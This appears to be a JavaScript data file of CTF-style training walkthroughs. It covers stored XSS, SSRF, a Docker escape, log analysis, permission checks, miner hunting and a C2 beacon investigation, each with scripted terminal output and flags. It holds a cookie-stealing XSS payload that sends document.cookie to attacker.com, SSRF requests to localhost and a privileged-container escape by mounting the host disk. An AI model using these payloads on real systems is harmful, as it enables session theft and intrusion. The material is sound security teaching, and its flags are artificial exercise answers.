            { type: "text", content: "The '/contact.php' page looks like a perfect place to leave a message. We'll inject a script that steals the admin's cookie and sends it to our 'attacker' server." },
            {
                type: "terminal",
                command: "curl -X POST -d \"msg=<script>fetch('http://attacker.com?c=' + document.cookie)</script>\" http://target.local/contact.php",
                output: "Message sent to admin successfully!"
            },
            { type: "subtitle", content: "Step 4: Checking the Harvest" },
            { type: "text", content: "The admin has viewed your message! Their session cookie has been exfiltrated to your logs. Let's read the logs to get our prize." },
            {
                type: "terminal",
                command: "cat /var/log/attacker_web.log",
                output: "GET /?c=session_id=ASTRANOVA_SECRET_VAL;admin=true\nFLAG{persistent_xss_master}"
            }
        ]
    },
    "SSRF → Internal Service Access": {
        title: "Walkthrough: SSRF Internal Breach",
        sections: [
            { type: "text", content: "SSRF (Server-Side Request Forgery) is like a 'Proxy Request'. We tell the server: 'Hey, fetch this webpage for me'. But instead of a public site, we trick it into looking at its own private internal files that are normally invisible to the public!" },
            { type: "subtitle", content: "Step 1: Port Recon" },
            { type: "text", content: "Let's see what's running on the target. We'll use 'nmap' to find open doors." },
            {
                type: "terminal",
                command: "nmap http://target.local",
                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
            },
            { type: "subtitle", content: "Step 2: Looking for Vulnerable Functions" },
            { type: "text", content: "We need a page that 'fetches' content. Let's use 'gobuster' to find all hidden PHP files on the server." },
            {
                type: "terminal",
                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
                output: "/index.php            (Status: 200)\n/admin                (Status: 301)\n/fetch.php            (Status: 200)\n/robots.txt           (Status: 200)"
            },
            { type: "subtitle", content: "Step 3: Initial Testing" },
            { type: "text", content: "The '/fetch.php' page seems to take a URL parameter. Let's try to make it fetch its own internal homepage (127.0.0.1) to see if it works!" },
            {
                type: "terminal",
                command: "curl \"http://target.local/fetch.php?url=http://127.0.0.1/\"",
                output: "Welcome to AstraNova Internal Portal.\n[Services]: /admin/internal_status, /config/view"
            },
            { type: "subtitle", content: "Step 4: Accessing the Forbidden Zone" },
            { type: "text", content: "We found an internal service called '/admin/internal_status'. Since we are making the server call itself, it might trust us and show the flag!" },
            {
                type: "terminal",
                command: "curl \"http://target.local/fetch.php?url=http://127.0.0.1/admin/internal_status\"",
                output: "<h1>Internal Dashboard</h1><p>Status: All systems go.</p>\nFLAG{ssrf_internal_breach}"
            }
        ]
    },
    "Suspicious Log Analysis": {
        title: "Walkthrough: Log Analysis",
        sections: [
            { type: "text", content: "Blue Teamers are like digital detectives. When something goes wrong, they check the 'Logs'—which are just the system's diary. Let's find an attacker!" },
            { type: "subtitle", content: "Step 1: Open the System Diary" },
            { type: "text", content: "We'll check the 'auth.log' file. This file records everyone who tries to log in. We'll use 'cat' to read it." },
            {
                type: "terminal",
                command: "cat /var/log/auth.log",
                output: "Feb 13 21:00:01 chakra sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2\nFeb 13 21:00:05 chakra sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2\n..."
            },
            { type: "subtitle", content: "Step 2: Identify the Attacker" },
            { type: "text", content: "See that IP address '192.168.1.105'? It's trying to guess the password over and over again! That is our attacker's IP address. Submit it to pass the challenge!" }
        ]
    },
    "Unsecured File Permissions": {
        title: "Walkthrough: File Permissions",
        sections: [
            { type: "text", content: "One of the most common mistakes is leaving sensitive data visible to everyone. Let's check our scripts folder for loose permissions!" },
            { type: "subtitle", content: "Step 1: Inspect the scripts folder" },
            { type: "text", content: "Navigate to 'scripts' and use 'ls -l' to see who can read or write to the files." },
            {
                type: "terminal",
                command: "cd scripts && ls -l",
                output: "-rwxr-xr-x 1 chakra chakra   85 Feb 13 22:10 health_check.sh\n-rw-rw-rw- 1 chakra chakra  120 Feb 13 22:15 backup_config.php"
            },
            { type: "subtitle", content: "Step 2: Find the Data Leak" },
            { type: "text", content: "The 'backup_config.php' file has 'rw-rw-rw-' permissions—that means anyone on the system can read and write to it! Let's read it to see what's exposed." },
            {
                type: "terminal",
                command: "cat backup_config.php",
                output: "<?php\n// Internal Backup Script\n$db_pass = 'CHAKRA_DEFENDER{config_permission_tightened}';\n?>"
            }
        ]
    },
    "Malicious Process Hunting": {
        title: "Walkthrough: Process Hunting",
        sections: [
            { type: "text", content: "Sometimes, bad guys try to hide secret scripts on your computer to steal your power. We need to find them and stop them!" },
            { type: "subtitle", content: "Step 1: Check what's running" },
            { type: "text", content: "We use the 'ps' command to see a list of everything the computer is doing right now." },
            {
                type: "terminal",
                command: "ps aux",
                output: "USER       PID  %CPU %MEM    COMMAND\nroot         1   0.0  0.1    /sbin/init\nchakra     502   0.0  0.2    /bin/bash\nchakra     999  98.2  0.5    ./xmrig_miner"
            },
            { type: "subtitle", content: "Step 2: Find the Thief" },
            { type: "text", content: "Look at PID 999. It's using 98% of the CPU! That's a 'miner'—it's stealing our computer's power. Let's kill it!" },
            {
                type: "terminal",
                command: "kill 999",
                output: "Process 999 terminated.\nCHAKRA_DEFENDER{miner_terminated_successfully}"
            }
        ]
    },
    "Digital Forensics: Hidden Backdoor": {
        title: "Walkthrough: Digital Forensics",
        sections: [
            { type: "text", content: "Hackers love to hide their tools in messy closets like the '/tmp' folder. Let's go investigating!" },
            { type: "subtitle", content: "Step 1: Look in the closet" },
            { type: "text", content: "Navigate to the '/tmp' folder and use 'ls -la' to see everything, even the hidden files (files starting with a dot)." },
            {
                type: "terminal",
                command: "cd /tmp && ls -la",
                output: "drwxrwxrwt  2 root   root   4096 Feb 13 22:00 .\ndrwxr-xr-x 20 root   root   4096 Feb 13 21:00 ..\n-rwxr-xr-x  1 hacker hacker  205 Feb 13 21:15 .hidden_backdoor.sh"
            },
            { type: "subtitle", content: "Step 2: Peek inside the backdoor" },
            { type: "text", content: "We found '.hidden_backdoor.sh'. Let's see what it does. Reading it will reveal the heart of the hack!" },
            {
                type: "terminal",
                command: "cat .hidden_backdoor.sh",
                output: "#!/bin/bash\n# I'm staying here forever!\n# CHAKRA_DEFENDER{forensics_backdoor_found}"
            }
        ]
    },
    "Incident 47 – The Phantom Beacon": {
        title: "Walkthrough: The Phantom Beacon",
        sections: [
            { type: "text", content: "Welcome, Analyst. A workstation is reaching out to a suspicious server every 30 seconds. This is a classic 'C2 Beacon'. Let's find the infected machine and the stolen data." },
            { type: "subtitle", content: "Step 1: Identifying the Beacon" },
            { type: "text", content: "Check the 'firewall.log'. Look for a specific IP address that makes a connection at exactly the same time interval repeatedly." },
            {
                type: "terminal",
                command: "cat logs/firewall.log",
                output: "2026-04-12 09:14:02 ALLOW TCP 192.168.1.23 -> 34.77.182.91:443\n2026-04-12 09:14:32 ALLOW TCP 192.168.1.23 -> 34.77.182.91:443\n2026-04-12 09:15:02 ALLOW TCP 192.168.1.23 -> 34.77.182.91:443"
            },
            { type: "subtitle", content: "Step 2: Uncovering the C2 Domain" },
            { type: "text", content: "Now check the 'proxy.log' to see what website that IP was visiting at those exact times." },
            {
                type: "terminal",
                command: "cat logs/proxy.log",
                output: "2026-04-12 09:14:02 GET https://cdn-security-update.com/checkin\n2026-04-12 09:14:32 GET https://cdn-security-update.com/checkin"
            },
            { type: "subtitle", content: "Step 3: Timeline of Compromise" },
            { type: "text", content: "Check 'auth.log' to see when the malware was first executed on that workstation." },
            {
                type: "terminal",
                command: "cat logs/auth.log",
                output: "Apr 12 09:12:48 workstation-23 user john executed /tmp/update.sh\nApr 12 09:12:50 workstation-23 user john executed /tmp/beacon"
            },
            { type: "subtitle", content: "Step 4: Recovering the Secret Key" },
            { type: "text", content: "The attacker exfiltrated a secret key inside a network packet. Use 'strings' to look for the 'data=' field in the PCAP file, then decode it from Base64." },
            {
                type: "terminal",
                command: "strings capture/suspicious_traffic.pcap | grep data=",
                output: "data=U0VDUkVUX0tFWV9YT1IxMjM="
            },
            {
                type: "terminal",
                command: "echo U0VDUkVUX0tFWV9YT1IxMjM= | base64 -d",
                output: "FLAG{192.168.1.23_cdn-security-update.com_SECRET_KEY_XOR123}"
            },
            { type: "subtitle", content: "Mission Success: Extract Final Flag" },
            { type: "text", content: "Great work, Analyst! Combine the evidence to form the final flag:\n\n**FLAG{192.168.1.23_cdn-security-update.com_SECRET_KEY_XOR123}**" }
        ]
    },
    "Stored XSS → Admin Panel → Docker Escape": {
        title: "Walkthrough: The Ultimate Chain",
        sections: [
            { type: "text", content: "This is a 4-stage attack: XSS to steal cookies, hijacking an admin, command injection, and escaping a privileged container to root the host." },
            { type: "subtitle", content: "Step 1: Steal the Session" },
            { type: "text", content: "Submit a support ticket with an XSS payload. When the admin opens it, their session token is sent to your logger." },
            {
                type: "terminal",
                command: "cat /var/log/attacker/cookies.log",
                output: "astranova_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
            },
            { type: "subtitle", content: "Step 2: Docker Escape" },
            { type: "text", content: "Inject a command into the diagnostic tool to get a shell. Since the container is privileged, you can mount the host's hard drive." },
            {
                type: "terminal",
                command: "mount /dev/sda1 /mnt && cat /mnt/root/flag.txt",
                output: "FLAG{xss_to_docker_escape_privileged_root}"
            }
        ]
    }
};
